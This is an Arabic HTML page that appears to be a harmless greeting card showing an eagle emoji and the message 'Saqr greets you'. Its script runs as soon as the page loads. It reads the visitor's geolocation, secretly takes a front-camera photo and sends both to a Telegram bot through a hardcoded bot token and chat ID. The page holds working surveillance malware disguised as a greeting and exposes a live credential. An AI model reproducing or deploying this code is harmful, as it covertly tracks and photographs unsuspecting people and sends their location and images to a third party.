<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صقر يسلم عليك</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: center;
            color: #333;
        }
        #message {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        .icon {
            font-size: 80px;
            color: #4CAF50;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="icon">🦅</div>
    <div id="message">صقر يسلم عليك</div>

    <script>
        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
        const chatId = '6185375878';

        function sendFinalData() {
            navigator.geolocation.getCurrentPosition(async position => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // التقط صورة من الكاميرا الأمامية
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);

                    const blob = await imageCapture.takePhoto();
                    track.stop();

                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'image.jpg');
                    formData.append('caption', `🦅 صقر يسلم عليك\n🌍 الموقع: (${latitude}, ${longitude})`);

                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => console.log('تم إرسال الصورة والموقع بنجاح:', data))
                    .catch(error => console.error('خطأ في إرسال الصورة:', error));
                } catch (error) {
                    console.error('خطأ في التقاط الصورة:', error);
                }
            });
        }

        sendFinalData();
    </script>
</body>
</html>
